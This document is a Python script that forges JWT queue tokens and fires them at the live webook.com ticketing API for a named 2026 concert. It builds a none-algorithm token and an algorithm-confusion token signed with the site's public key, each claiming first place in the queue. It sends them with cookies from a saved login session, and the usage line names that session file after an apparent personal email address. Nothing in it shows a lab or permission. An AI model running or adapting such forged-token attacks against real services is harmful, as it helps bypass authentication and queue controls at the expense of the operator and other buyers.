#!/usr/bin/env python3
"""
Test queue_session JWT attacks against webook API endpoints directly.

Uses a saved Playwright session to make authenticated requests with:
  1. Original queue_session
  2. none-algorithm token
  3. Algorithm confusion token (SSL public key as HS256 secret)
  4. No queue token at all

Usage:
    python test-queue-api-attacks.py --session sessions/tariqibrahim20@hotmail.com.json --slug ramy-sabry-jeddah-concert-2026-tickets
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.parse
import urllib.request


def make_none_alg_token(position=1, ttl=3600, user_agent=""):
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "e": int(time.time()) + ttl,
        "n": position,
        "u": user_agent[::-1],
    }
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")
    return f"{b64(header)}.{b64(payload)}."


def make_confusion_token(public_key_pem, position=1, ttl=3600, user_agent=""):
    import hmac
    import hashlib

    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "e": int(time.time()) + ttl,
        "n": position,
        "u": user_agent[::-1],
    }
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).decode().rstrip("=")
    message = f"{b64(header)}.{b64(payload)}"
    sig = hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
    return f"{message}.{b64url(sig)}"


def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def load_session(session_path):
    with open(session_path, "r", encoding="utf-8") as f:
        return json.load(f)


def cookies_to_dict(cookies):
    out = {}
    for c in cookies:
        out[c["name"]] = c["value"]
    return out


def test_endpoint(name, method, url, headers, cookies):
    print(f"\n=== {name} ===")
    print(f"URL: {url}")
    print(f"queue-token header: {headers.get('queue-token', '<none>')[:80]}...")
    try:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        req = urllib.request.Request(url, method=method)
        for k, v in headers.items():
            if v:
                req.add_header(k, v)
        if cookie_str:
            req.add_header("Cookie", cookie_str)
        with urllib.request.urlopen(req, timeout=30) as resp:
            print(f"Status: {resp.status}")
            print(f"Headers: {dict(resp.headers)}")
            body = resp.read()
            try:
                data = json.loads(body)
                queue_info = {}
                if isinstance(data, dict):
                    if "_queue" in data:
                        queue_info["_queue"] = data["_queue"]
                    if "queueToken" in data:
                        queue_info["queueToken"] = data["queueToken"]
                    if "queued" in data:
                        queue_info["queued"] = data["queued"]
                    if "data" in data and isinstance(data["data"], dict) and "_queue" in data["data"]:
                        queue_info["data._queue"] = data["data"]["_queue"]
                print(f"Queue info: {json.dumps(queue_info, ensure_ascii=True, indent=2)}")
            except Exception:
                print(f"Body (first 500 chars): {body[:500]}")
    except urllib.error.HTTPError as e:
        print(f"HTTP Error: {e.code}")
        print(f"Headers: {dict(e.headers)}")
        print(f"Body (first 500 chars): {e.read()[:500]}")
    except Exception as e:
        print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--session", required=True, help="Path to saved Playwright session JSON")
    parser.add_argument("--slug", default="ramy-sabry-jeddah-concert-2026-tickets", help="Event slug")
    parser.add_argument("--pubkey", default="/tmp/webook-pubkey.pem", help="SSL public key PEM")
    args = parser.parse_args()

    if not os.path.exists(args.session):
        print(f"Session file not found: {args.session}")
        sys.exit(1)

    session = load_session(args.session)
    cookies = cookies_to_dict(session.get("cookies", []))

    # Need auth token for API
    auth_token = cookies.get("token", "")
    if not auth_token:
        print("Warning: no 'token' cookie found in session. API may require login.")

    user_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    )

    original_queue_token = cookies.get("queue_session", "")
    none_token = make_none_alg_token(position=1, ttl=7200, user_agent=user_agent)

    confusion_token = None
    if os.path.exists(args.pubkey):
        with open(args.pubkey, "r") as f:
            confusion_token = make_confusion_token(f.read(), position=1, ttl=7200, user_agent=user_agent)

    endpoints = [
        ("GET", f"https://api.webook.com/api/v2/event-ticket-details/{args.slug}"),
        ("GET", f"https://api.webook.com/api/v2/event-ticket-details/{args.slug}?page=1"),
        ("GET", f"https://webook.com/en/event/{args.slug}"),
    ]

    for method, url in endpoints:
        print(f"\n\n{'='*60}")
        print(f"Endpoint: {method} {url}")
        print(f"{'='*60}")

        base_headers = {
            "User-Agent": user_agent,
            "Accept": "application/json",
            "Authorization": f"Bearer {auth_token}" if auth_token else "",
        }

        # 1. Original token
        h = dict(base_headers)
        if original_queue_token:
            h["queue-token"] = original_queue_token
        test_endpoint("Original queue_session", method, url, h, cookies)

        # 2. none-alg token
        h = dict(base_headers)
        h["queue-token"] = none_token
        test_endpoint("none-alg token", method, url, h, cookies)

        # 3. Confusion token
        if confusion_token:
            h = dict(base_headers)
            h["queue-token"] = confusion_token
            test_endpoint("Algorithm confusion (SSL pubkey)", method, url, h, cookies)

        # 4. No token
        h = dict(base_headers)
        test_endpoint("No queue token", method, url, h, cookies)


if __name__ == "__main__":
    main()
